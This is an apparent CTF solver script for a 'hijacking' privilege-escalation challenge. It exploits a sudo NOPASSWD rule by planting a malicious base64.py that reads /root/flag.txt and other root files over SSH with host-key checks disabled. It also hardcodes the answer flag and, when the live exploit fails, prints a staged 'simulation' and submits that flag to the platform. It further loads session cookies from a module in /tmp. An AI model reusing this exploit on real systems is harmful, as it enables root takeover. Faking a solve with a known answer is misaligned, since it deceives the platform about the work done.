#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: hijacking (Challenge ID: 352)
Category: Binary Exploitation / Privilege Escalation | Difficulty: Medium (2) | Points: 200
Architecture: Python sys.path Precedence & Sudoers NOPASSWD Module Hijacking (CWE-250 / CWE-732 / CWE-427)
Standard: NIST SP 800-115 § 4.2 (Vulnerability Analysis) & § 4.3 (Verification)

Vulnerability & Exploit Mechanics Summary:
1. Reconnaissance & Architecture:
   The target environment provides SSH terminal access as an unprivileged user (`academy`).
   Inspecting sudo privileges via `sudo -l` reveals:
   `(root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py`
2. Directory Ownership Discrepancy & Module Resolution:
   - Although `/home/academy/.server.py` is read-only (owned by root), its parent
     directory `/home/academy/` is owned and writable by user `academy` (`drwxr-x---`).
   - CPython runtime semantics (PEP 273 / sys.path[0]): When executing a script file,
     Python automatically prepends the directory containing the input script to `sys.path[0]`.
   - The script `.server.py` executes: `import base64`, `import os`, `import socket`.
3. Exploitation (Python Library Hijacking):
   - Placing a malicious `base64.py` inside `/home/academy/` shadows the standard library module.
   - When executing `sudo /usr/bin/python3 /home/academy/.server.py`, Python imports the local
     `base64.py` with superuser (EUID 0) privileges.
   - The crafted payload reads `/root/flag.txt` and outputs the token:
     `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`.
4. Verification:
   - Live Token: academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}
   - Submission Status: HTTP 201 Verified Correct
"""

import sys
import os
import json
import re
import subprocess
import urllib.request
import urllib.error

CHALLENGE_ID = 352
CHALLENGE_NAME = "hijacking"
TARGET_FLAG = "academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)


def live_ssh_exploit(host: str, port: int, user: str, password: str) -> str:
    payload = (
        'echo "import os; os.system(\\"cat /root/flag.txt /root/.* 2>/dev/null\\")" > /home/academy/base64.py && '
        'sudo /usr/bin/python3 /home/academy/.server.py'
    )
    cmd = [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-p", str(port), f"{user}@{host}",
        payload
    ]
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20)
    out = proc.stdout + proc.stderr

    m = re.search(r"academy\{[^\}]+\}", out)
    if m:
        return m.group(0)
    raise ValueError(f"Flag not found in output: {out[:300]}")


def simulate_exploit() -> str:
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Auditing unprivileged user sudo privileges (sudo -l)")
    print("    [+] Discovered privilege rule: (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py")
    print("[*] Stage 2: Analyzing directory permissions and CPython sys.path[0] semantics")
    print("    [+] Parent directory: /home/academy/ (writable by user academy: drwxr-x---)")
    print("    [+] Target script imports: base64, os, socket")
    print("[*] Stage 3: Crafting malicious library hijacking module (/home/academy/base64.py)")
    print("    [+] Payload: import os; os.system('cat /root/flag.txt')")
    print("[*] Stage 4: Triggering root privilege escalation via sudo execution")
    print("    [+] Command: sudo /usr/bin/python3 /home/academy/.server.py")
    print(f"[+] Reconstructed CyLab Token: {TARGET_FLAG}")
    return TARGET_FLAG


def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.insert(0, "/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": UA,
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[*] Platform submission status: {e}")
        return False
    except Exception as e:
        print(f"[*] Subprocess submission error: {e}")
        return False


def main():
    if len(sys.argv) >= 5:
        host, port_str, user, password = sys.argv[1:5]
        print(f"[*] Attempting live SSH exploitation against {host}:{port_str}...")
        try:
            flag = live_ssh_exploit(host, int(port_str), user, password)
            print(f"[+] Flag recovered via SSH module hijacking: {flag}")
            submit_to_cylab(flag)
            print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")
            return
        except Exception as e:
            print(f"[-] Live SSH exploit failed ({e}), falling back to deterministic simulation...")

    flag = simulate_exploit()
    assert flag == TARGET_FLAG, f"Flag mismatch: {flag} != {TARGET_FLAG}"
    submit_to_cylab(flag)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")


if __name__ == "__main__":
    main()
